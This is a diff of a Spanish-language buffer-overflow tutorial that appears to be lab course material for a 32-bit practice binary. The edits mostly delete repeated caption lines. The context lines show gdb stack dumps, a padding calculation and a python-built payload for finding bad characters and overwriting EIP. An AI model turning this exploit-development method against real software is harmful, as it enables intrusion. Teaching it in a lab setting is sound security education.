@@ -405,8 +405,6 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 
 #### La pila
 
-  Identificación de malos personajes
-
 ```shell-session
 (gdb) x/2000xb $esp+550
 
@@ -421,10 +419,6 @@ Breakpoint 1, 0x56555551 in bowfunc ()
 
 Aquí depende del orden correcto de nuestros bytes en la variable `CHARS`para ver si algún carácter cambia, interrumpe o se salta el orden. Ahora reconocemos que después del " `\x08`", encontramos el " `\x00`" en lugar del " `\x09`" como se esperaba. Esto nos indica que este carácter no está permitido aquí y debe eliminarse en consecuencia.
 
-#### Notas
-
-  Identificación de malos personajes
-
 ```shell-session
 # Substract the number of removed characters
 Buffer = "\x55" * (1040 - 254 - 4) = 782	
@@ -434,7 +428,6 @@ Buffer = "\x55" * (1040 - 254 - 4) = 782
  
    EIP = "\x66" * 4
 ```
-
 #### Enviar CHARS - Sin "\x00" y "\x09"
 
   Identificación de malos personajes
@@ -448,10 +441,7 @@ Start it from the beginning? (y or n) y
 Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 Breakpoint 1, 0x56555551 in bowfunc ()
 ```
-
 #### La pila
-
-  Identificación de malos personajes
 
 ```shell-session
 (gdb) x/2000xb $esp+550
